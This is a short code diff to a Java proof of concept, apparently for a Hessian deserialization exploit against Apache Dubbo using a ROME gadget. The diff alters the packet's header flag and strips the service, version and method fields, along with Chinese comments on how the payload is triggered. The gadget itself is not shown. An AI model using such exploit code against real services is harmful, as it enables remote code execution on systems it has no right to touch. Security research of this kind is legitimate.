@@ -74,7 +74,7 @@ public class RomePoc {
     // set magic number.
     Bytes.short2bytes((short) 0xdabb, header);
     // set request and serialization flag.
-    header[2] = (byte) ((byte) 0x80 | 2);
+    header[2] = (byte) ((byte) 0x20 | 2);
 
     // set request id.
     Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
@@ -82,16 +82,7 @@ public class RomePoc {
     ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
     Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
 
-    //todo 经测试，以下4个随意填
-    //注册中心获取到的service全限定名、版本号、方法名
-    out.writeUTF("2.0.2");
-    out.writeUTF("com.threedr3am.learn.server.boot.DemoService");
-    out.writeUTF("1.0");
-    out.writeUTF("hello");
-    //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
-    out.writeUTF("Ljava/util/Map;");
     out.writeObject(s);
-    out.writeObject(new HashMap());
 
     out.flushBuffer();
     if (out instanceof Cleanable) {
